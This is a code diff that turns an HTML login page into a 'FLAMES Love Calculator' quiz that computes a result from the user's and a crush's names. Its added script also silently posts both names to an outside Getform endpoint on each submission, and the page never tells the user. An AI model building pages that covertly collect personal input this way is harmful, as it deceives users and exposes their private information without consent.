@@ -2,36 +2,32 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Login Page</title>
+  <title>FLAMES Love Calculator</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-image: url('https://imgs.search.brave.com/-TYGVBIojzLeSd4x6Ww-8FWJ1LZx7lb2uJ-wCOu5mO0/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly93d3cu/Y29sbGVnZWJhdGNo/LmNvbS9zdGF0aWMv/Y2xnLWdhbGxlcnkv/c3JpLWVzaHdhci1j/b2xsZWdlLW9mLWVu/Z2luZWVyaW5nLWNv/aW1iYXRvcmUtMjcz/NTU4LmpwZw');
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
+      background-color: #f9f9f9;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
 
-    .login-container {
-      background-color: rgba(255, 255, 255, 0.9);
+    .flames-container {
+      background-color: #fff;
       padding: 30px;
       border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
       width: 350px;
       text-align: center;
     }
 
-    .login-container img {
-      width: 120px;
-      margin-bottom: 20px;
+    h2 {
+      color: #e91e63;
     }
 
-    .login-container input[type="text"],
-    .login-container input[type="password"] {
+    input[type="text"] {
       width: 90%;
       padding: 10px;
       margin: 10px 0;
@@ -39,32 +35,89 @@
       border: 1px solid #ccc;
     }
 
-    .login-container input[type="submit"] {
+    input[type="submit"] {
       width: 95%;
       padding: 10px;
-      background-color: #4CAF50;
+      background-color: #e91e63;
       color: white;
       border: none;
       border-radius: 5px;
       cursor: pointer;
     }
 
-    .login-container input[type="submit"]:hover {
-      background-color: #45a049;
+    input[type="submit"]:hover {
+      background-color: #c2185b;
+    }
+
+    #result {
+      margin-top: 20px;
+      font-weight: bold;
+      font-size: 18px;
+      color: #333;
     }
   </style>
 </head>
 <body>
 
-  <div class="login-container">
-    <img src="https://imgs.search.brave.com/QiTj72qM0_rtbkNFV9j7WN0XhaifCDQIqhSmOyJykXw/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9sb2dv/Lmx1c2hhLmNvL2Qv/Y29tcGFueV8xMzMx/OTk0N19sb2dvLmpw/Zw" alt="Logo">
-    <h2>Login</h2>
-    <form action="#" method="post">
-      <input type="text" name="username" placeholder="Username" required><br>
-      <input type="password" name="password" placeholder="Password" required><br>
-      <input type="submit" value="Login">
+  <div class="flames-container">
+    <h2>FLAMES Love Calculator</h2>
+    <form id="flamesForm">
+      <input type="text" id="your_name" name="your_name" placeholder="Your Name" required><br>
+      <input type="text" id="crush_name" name="crush_name" placeholder="Crush's Name" required><br>
+      <input type="submit" value="Calculate ❤️">
     </form>
+    <div id="result"></div>
   </div>
+
+  <script>
+    const form = document.getElementById('flamesForm');
+    const resultDiv = document.getElementById('result');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const name1 = document.getElementById('your_name').value.toLowerCase().replace(/\s/g, '');
+      const name2 = document.getElementById('crush_name').value.toLowerCase().replace(/\s/g, '');
+
+      if (!name1 || !name2) {
+        resultDiv.innerText = 'Please enter both names.';
+        return;
+      }
+
+      let temp1 = name1;
+      let temp2 = name2;
+
+      for (let char of name1) {
+        if (temp2.includes(char)) {
+          temp1 = temp1.replace(char, '');
+          temp2 = temp2.replace(char, '');
+        }
+      }
+
+      const count = temp1.length + temp2.length;
+      const flames = ['Friends', 'Love', 'Affection', 'Marriage', 'Enemies', 'Siblings'];
+      let index = 0;
+
+      while (flames.length > 1) {
+        index = (index + count - 1) % flames.length;
+        flames.splice(index, 1);
+      }
+
+      resultDiv.innerText = `Result: ${flames[0]} 💖`;
+
+      // Send data to Getform
+      fetch('https://getform.io/f/anlxpqwa', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          your_name: document.getElementById('your_name').value,
+          crush_name: document.getElementById('crush_name').value
+        })
+      }).catch(error => {
+        console.error('Form submission failed:', error);
+      });
+    });
+  </script>
 
 </body>
 </html>
